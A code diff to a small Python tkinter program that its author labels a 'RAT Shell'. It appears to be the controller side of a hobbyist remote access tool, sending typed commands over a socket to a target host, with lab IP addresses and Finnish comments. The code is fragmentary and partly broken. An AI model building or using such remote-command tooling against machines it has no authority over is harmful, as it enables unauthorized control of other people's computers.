@@ -4,7 +4,7 @@ import tkinter
 import socket
 from commands import Commands
 import subprocess
-import sys
+
 socket.setdefaulttimeout(15)
 
 class MainServer(tk.Tk):
@@ -34,11 +34,11 @@ class MainServer(tk.Tk):
         self.geometry('300x500+500+500')
         
         # label
-        self.label = ttk.Label(self, text='Want to take a screenshot?')
+        self.label = ttk.Label(self, text='RAT Shell!')
         self.label.pack()
         self.teksti = tkinter.Text(self, width=50, height=50)
         self.teksti.pack()
-        command = self.teksti.get('1.0', 'end').split('\n')[-2].encode()
+        #command = self.teksti.get('1.0', 'end').split('\n')[-2].encode()
         
         
         # button
@@ -55,9 +55,10 @@ class MainServer(tk.Tk):
                     #     exit()
                     #self.teksti.insert('end', f'\n{subprocess.getoutput(command)}')
 
-        # command = self.teksti.bind('<Return>', execute)
+        # command = self.teksti.bind('<Return>', lambda event :execute())
         while True:
                 #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
+            command = self.teksti.bind('<Return>', lambda event :execute())
             command = input('>> ').encode()
             
                 
@@ -92,4 +93,3 @@ if __name__ == "__main__":
 
     appi = MainServer(iipee, 80) #172.20.16.61 Jorma, 192.168.56.1 UbU
     appi.mainloop()
-
